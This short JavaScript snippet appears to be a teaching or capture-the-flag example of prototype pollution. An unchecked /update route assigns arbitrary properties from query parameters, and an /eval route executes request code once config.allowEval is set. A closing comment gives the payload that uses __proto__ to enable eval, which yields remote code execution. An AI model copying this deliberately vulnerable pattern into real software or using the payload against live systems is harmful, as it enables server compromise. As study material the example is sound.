

const config = {
    //allowEval: true
    }
const users = {
    "guest": {name: "guest"},
    }

    
function updateUser(username, prop, value){
    users[username][prop] = value
    }
    
app.route("/update", (req) => {
    const {name, prop, value} = req.query
    updateUser(name, prop, value)
    })
    
app.route("/eval", (req) => {
    const {code} = req.query
    if (!config.allowEval){
    return req.status(403)
    }
    eval(code)
})

//  name=__proto__&prop=allowEval&value=true